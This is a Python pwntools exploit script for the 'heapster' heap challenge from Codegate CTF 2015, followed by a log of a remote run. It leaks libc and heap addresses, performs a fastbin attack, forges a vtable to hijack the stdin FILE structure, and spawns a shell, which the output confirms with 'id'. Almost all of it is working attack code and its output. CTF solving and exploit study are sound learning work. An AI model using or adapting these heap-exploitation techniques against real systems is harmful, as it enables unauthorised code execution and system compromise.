#!/usr/bin/env python  

from pwn import *
import sys

def malloc(size):
    r.sendlineafter("cmd>>", "0")
    r.sendlineafter("size>>", size)
    leak = int(r.recvuntil("[ 0]").split("= ")[1][:14],16)
    return leak

def realloc(addr, size):
    r.sendlineafter("cmd>>", "1")
    r.sendlineafter("addr>>", addr)
    r.sendlineafter("size>", size)

def free(addr):
    r.sendlineafter("cmd>>", "2")
    r.sendlineafter("addr>>", addr)

def dump(addr):
    r.sendlineafter("cmd>>", "4")
    r.sendlineafter("addr>>", addr)
    return r.recvuntil("\n\n")

def fill(addr, data):  
    r.sendlineafter("cmd>>", "3")
    r.sendlineafter("addr>>", addr)
    r.sendlineafter("data>>", data)

def parseAddr(leak, start):
    addr  = int("0x"+leak[start],16)
    addr += int("0x"+leak[start+1],16)*0x100
    addr += int("0x"+leak[start+2],16)*0x10000
    addr += int("0x"+leak[start+3],16)*0x1000000
    addr += int("0x"+leak[start+4],16)*0x100000000
    addr += int("0x"+leak[start+5],16)*0x10000000000
    return addr

def sliceAddr(addr):   
    result = ""
    result += hex(addr&0xff).lstrip("0x")+"\n"
    result += hex((addr&0xff00)/0x100).lstrip("0x")+"\n"
    result += hex((addr&0xff0000)/0x10000).lstrip("0x")+"\n"
    result += hex((addr&0xff000000)/0x1000000).lstrip("0x")+"\n"
    result += hex((addr&0xff00000000)/0x100000000).lstrip("0x")+"\n"
    result += hex((addr&0xff0000000000)/0x10000000000).lstrip("0x")+"\n"
    result += "00\n00\n"

    return result

def exploit(r):
    ## LIBC AND HEAP LEAK
    log.info("grooming heap...")
    A = malloc("200") # A
    B = malloc("200") # B
    C = malloc("200") # C
    D = malloc("200") # D
    E = malloc("200") # E
    F = malloc("200") # F

    free(hex(A))
    free(hex(C))
    free(hex(E))

    F = malloc("200")  

    # local
    #libc_offset = 0x3c4b78
    #heap_offset = 0x11b0

    #remote
    libc_offset = 0x3c17b8
    heap_offset = 0x1a0

    leak = dump(hex(F))
    leak = leak.split(" ")

    libc_base = parseAddr(leak, 1)-libc_offset
    heap_base = parseAddr(leak, 9)-heap_offset

    log.success("libc_base at: "+hex(libc_base))
    log.success("heap_base at: "+hex(heap_base))

    ## RIP CTRL
    G = malloc("104") # fast chunk
    free("i0")
    
    log.info("setting chunkCount...")
    # set numChunks = 0x8
    realloc("i0", "104")
    realloc("i0", "104")
    realloc("i0", "104")
    realloc("i0", "104")
    free("i0")
    
    # OVERWRITE FASTCHUNK->FD PTR + CRAFT FAKE VTABLE
    # local
    # stdout_vtable= libc_base+0x3c56f8
    # stderr_vtable= libc_base+0x3c5610
    # stdin_vtable = libc_base+0x3c49b8
    # one_shot = libc_base+0xf0274
    
    # remote
    log.info("starting fastbin attack...")
    log.info("crafting fake vtable...")
    stdin_vptr = libc_base+0x3c2718
    one_shot = libc_base+0xe8fd5
    log.success("_IO_2_1_stdin vptr at: "+hex(stdin_vptr))
    payload  = sliceAddr(stdin_vptr-0x48+0xd)
    payload += sliceAddr(one_shot)
    for i in range(104-0x8-0x8):
        payload += "AA\n"
    fill("i4", payload) 
 
    
    fake_vtable = heap_base+0x1b0-0x20
    log.success("fake vtable at: "+hex(fake_vtable))   
    # ALLOCATE FAKE HEAP CHUNK/STDOUT OFFSET
    malloc("104")    
    malloc("104")    
    
    # OVERWRITE STDIN->VPTR W/ FAKE VPTR
    log.info("corrupting _IO_FILE stdin->_IO_jump_t*...")
    
    payload = ""
    payload += "00\n"*(0x2b-0x3)
    payload += sliceAddr(fake_vtable)
    payload += "00\n"*(0x68-0x2b-0x8)
 
    fill("i8",payload)
        
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/codegatectf15/heapster/heapster'], env={"LD_PRELOAD":"./libc-2.19.so"})
        #r = process(['/home/vagrant/CTFs/codegatectf15/heapster/heapster'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)

'''
>  heapster python solve-remote.py honj.in 4001 
[*] For remote: solve-remote.py HOST PORT
[+] Opening connection to honj.in on port 4001: Done
[*] grooming heap...
[+] libc_base at: 0x7f0284d71000
[+] heap_base at: 0x56536d372000
[*] setting chunkCount...
[*] starting fastbin attack...
[*] crafting fake vtable...
[+] _IO_2_1_stdin vptr at: 0x7f0285133718
[+] fake vtable at: 0x56536d372190
[*] corrupting _IO_FILE stdin->_IO_jump_t*...
[*] Switching to interactive mode
 
[ 0] Malloc
[ 1] Realloc
[ 2] Free
[ 3] Fill
[ 4] Dump
[ 5] Print blocklist
[ 6] Exit

cmd>> $ id
uid=1000(heapster) gid=1000(heapster) groups=1000(heapster)
'''
